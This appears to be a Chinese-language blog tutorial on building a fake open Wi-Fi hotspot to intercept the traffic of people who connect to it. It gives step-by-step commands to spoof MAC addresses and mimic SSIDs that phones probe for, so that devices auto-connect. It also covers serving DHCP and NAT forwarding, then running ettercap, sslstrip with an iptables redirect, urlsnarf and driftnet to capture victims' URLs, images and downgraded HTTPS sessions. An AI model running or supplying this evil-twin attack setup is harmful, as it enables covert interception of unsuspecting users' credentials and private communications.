建立soft Ap并进行嗅探，主要有如下4步：

1.airbase-ng建立热点
2.dhcpd启动dhcp服务
3.iptables设置好转发规则，使接入Soft AP客户的数据可正常访问互联网
4.启动嗅探工具收集信息

## 启动monitor模式 ##

    airmon-ng start wlan1
    ifconfig wlan1 down
    macchanger –r wlan1
    ifconfig wlan1 up
    ifconfig mon0 down
    macchanger –r mon0
    ifconfig mon0 up 
## 使用airbase-ng建立OPN的Soft AP ##

airbase-ng主要用于建立OPN的AP，也就是不需要密码的公开AP。WEP加密的已经很少见了，不支持WPA加密。这一步中，最关键的是AP的ssid，ssid决定了AP欺骗性，也就是被连接的可能性。现在手机、平板电脑的客户端会自动记录连接过的AP信息，保存在/data/misc/wifi/wpa_suppliant.conf中，每个热点保存四个信息：ssid、psk（密码）、key_mgmt（加密方式）、priority（优先级）。注意，其中不含网卡的硬件地址.所以，只需前三项对上，便可自动连接。
手机wifi功能打开时，会不断向外发送probe信息包，里面包含ssid。可用airodump-ng查看当前网络环境下有哪些被probe的ssid，供伪造ssid时参考。
选定名称后，便可使用airbase-ng建立Fake AP了：
airbase-ng $FAKE_AP_INTERFACE -e $FAKE_AP_ESSID -c
airbase-ng运行成功后，ifconfig查看，会多出一个at0接口。
 
## 利用 hostapd 建立 ap  ##
hostapd是一个带加密功能的无线接入点程序，是Linux操作系统上构件无线接入点的一个比较方便的工具，支持IEEE 802.11协议和IEEE 802.1X/WPA/WPA2/EAP/RADIUS加密。 

基本配置：

    ssid=test
    hw_mode=g
    channel=10
    interface=wlan0
    bridge=br0
    driver=nl80211
    ignore_broadcast_ssid=0
    macaddr_acl=0
    accept_mac_file=/etc/hostapd.accept
    deny_mac_file=/etc/hostapd.deny 
    
上面列出的配置基本上是必须的，其中：

ssid：别人所看到的我们这个无线接入点的名称； 
hw_mode：指定802.11协议，包括 a = IEEE 802.11a, b = IEEE 802.11b, g = IEEE 802.11g； 
channel：设定无线频道； 
interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可； 
bridge：指定所处网桥，对于一个同时接入公网、提供内部网和无线接入的路由器来说，设定网桥很有必要； 
driver：设定无线驱动，我这里是nl80211； 
macaddr_acl：可选，指定MAC地址过滤规则，0表示除非在禁止列表否则允许，1表示除非在允许列表否则禁止，2表示使用外部RADIUS服务器； 
accept_mac_file：指定允许MAC列表文件所在； 
deny_mac_file：指定禁止MAC列表文件所在； 
 
下面介绍关于认证方式的配置： 

    auth_algs=1
 
其中auth_algs指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。不过很奇怪的是，在我工作中如果配置了3，不管采用WEP/WPA/WP2加密的方式都从没连接成功过，配置为2也是如此。所以在我的配置当中，如果采用认证，则设置auth_algs为1；否则把这行代码注释掉（在前面加#）。
 
由于RADIUS认证需要提供外部RADIUS服务器，我们没有这个功能，因此我只研究了WEP、WPA和WPA2这三种加密方式。 
 
    #wep_default_key=0
    #wep_key0=1234567890
    #wep_key1="vwxyz"
    #wep_key2=0102030405060708090a0b0c0d
    #wep_key3=".2.4.6.8.0.23"
    #wep_key_len_broadcast=13
    #wep_key_len_unicast=13
    #wep_rekey_period=300
    
如果要启用WEP加密，只需配置wep_default_key和其中一个wep_keyx，其中x的值只能在0~3之间，wep_default_key的值必须启用了。注意wep_keyx的值不是任意的，只能是5、13或16个字符（用双引号括住），或者是10、26或32个16进制数字。由于WEP加密算法已经被破解了，所以通常不启用它，全部注释掉。 

    wpa=2
    wpa_passphrase=12345678
    wpa_key_mgmt=WPA-PSK
    #wpa_pairwise=TKIP CCMP
    rsn_pairwise=TKIP CCMP

现在推荐的加密方式是WPA/WPA2，由于时间紧迫，我没有怎么去了解过这两者的差别。不过配置是很简单的：

wpa：指定WPA类型，这是一个位域值（bit fields），第一位表示启用WPA，第二位表示启用WPA2。在我的配置中，无论设置成1、2或3，都可以正常连接； 
wpa_passphrase：WPA/WPA2加密需要指定密钥，这个选项就是配置WPA/WPA2的密钥。注意wpa_passphrase要求8~63个字符。另外还可以通过配置wpa_psk来制定密钥，不过要设置一个256位的16进制密钥，不适合我们的需求； 
wpa_pairwise/rsn_pairwise：如果启用了WPA，需要指定wpa_pairwise；如果启用了WPA2，需要指定rsn_pairwise，或者采用wpa_pairwise的设定。都可以设定成TKIP、CCMP或者两者都有，具体含义我也没仔细弄清楚。一篇比较老的文章说TKIP不兼容Windows Mobile，但我的Windows Mobile 6.5在这两种算法下都没有遇到任何问题。 

经过这样一些配置，启动hostapd之后应该就可以按照自己的需求正常使用无线接入点功能了： 

    /usr/bin/hostapd -f /etc/hostapd.conf 
    
REF： 
http://www.cnblogs.com/zhuwenger/archive/2011/03/11/1980294.html 
http://forum.ubuntu.org.cn/viewtopic.php?t=421829 
 
## dhcp服务 ##

客户端连接上SoftAP后，要给他们分配IP地址。这里有一条最关键，就是SoftAP的IP地址和Internet接口的IP地址不能在网一个段。比如，连接Internet网的网卡eth0，地址是10.10.10.138/24，则at0的地址后面不能设置为同一网段，这里设置为10.0.0.1/24。

### 安装dhcp服务 ###

    apt-get install isc-dhcp-server

接下来然后需要将SoftAP的接口，也就是airbase-ng创建的at0设置为该网段的网关：
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1500
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

### 启动dhcp服务 ###

    dhcpd -d -f -cf dhcpd.conf <INTERFACE>
    
## 使用iptables设置转发 ##

使用iptables设置转发，将用户连接SoftAP后的数据，转发到internet上，是非常关键的一步。网上各种版本很多，其实最简单的实现就一句指令：

    iptables -t nat -A POSTROUTING --out-interface $FAKE_AP_INTERNET -j MASQUERADE    #$FAKE_AP_INTERNET是外网接口
    
注意，转发生效需要本机开启ip_forward功能。指令是：

    echo "1" > /proc/sys/net/ipv4/ip_forward

由于后面运行ettercap时，会将该值再次变为0，所以等ettercap运行后再执行上述命令。

## 运行各种嗅探工具 ##

SoftAP建立并运行dhcp服务后，客户端就可以根据我们设定的规则连接上热点并正常浏览网页，运行各个程序了。接下来，就是针对Soft AP的接口at0，执行各种嗅探：

    ettercap -Tzq -i $FAKE_AP_AT_INTERFACE -w $SESSION_PATH/etter.pcap -L $SESSION_PATH/etter
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIP_PORT
    sslstrip -pkf -l $SSLSTRIP_PORT -w $SESSION_PATH/sslstrip.log 2>/dev/null
    urlsnarf -i $1 | grep http > $SESSION_PATH/url.txt
    tail -f $SESSION_PATH/url.txt
    driftnet -i $1 -d $SESSION_PATH/
